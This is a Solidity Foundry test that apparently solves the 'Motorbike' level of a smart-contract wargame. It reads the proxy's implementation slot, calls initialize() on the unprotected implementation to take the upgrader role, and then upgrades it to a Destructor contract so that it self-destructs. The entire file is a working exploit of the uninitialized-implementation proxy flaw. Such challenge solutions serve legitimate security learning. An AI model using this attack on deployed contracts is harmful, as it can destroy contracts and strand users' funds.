// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Motorbike, Engine} from "../instances/Ilevel25.sol";
import {Destructor} from "../src/level25.sol";

contract Attacker is Test {
    event Boom();

    Motorbike bike = Motorbike(payable(0x12569cE92cfF4c18a10aaCc3B55cA54280A8bD98));
    Engine engine = Engine(
        address(
            uint160(uint256(vm.load(address(bike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))
        )
    );

    function test() external {
        engine.initialize();
        assertEq(engine.upgrader(), address(this));

        Destructor destructor = new Destructor();

        vm.expectEmit(false, false, false, false);
        emit Boom();
        engine.upgradeToAndCall(address(destructor), abi.encodeCall(Destructor.destroy, ()));
    }
}
